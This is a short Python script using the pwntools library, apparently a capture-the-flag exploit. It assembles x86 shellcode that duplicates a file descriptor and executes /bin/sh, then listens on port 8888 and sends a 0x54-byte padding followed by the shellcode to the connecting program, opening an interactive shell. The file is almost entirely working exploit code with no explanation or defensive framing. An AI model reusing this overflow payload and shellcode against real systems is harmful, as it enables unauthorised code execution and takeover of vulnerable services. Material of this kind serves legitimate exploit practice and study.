#! /usr/bin/env python
# -*- coding: utf-8 -*-
# vim:fenc=utf-8
#
# Copyright © 2018 hzshang <hzshang15@gmail.com>

from pwn import *

# dup2(0,1)
# execve /bin/sh
code = """
    push 0x3f
    pop eax
    push 1
    pop ecx
    xor ebx,ebx
    int 0x80
    xor ecx,ecx
    xor edx,edx
    call here
    .ascii "/bin/sh"
    .byte 0
here:
    pop ebx
    push 0x0b
    pop eax
    int 0x80
"""
shell=asm(code)
l=listen(8888)
conn=l.wait_for_connection()
conn.send("a"*0x54+shell)
conn.interactive()
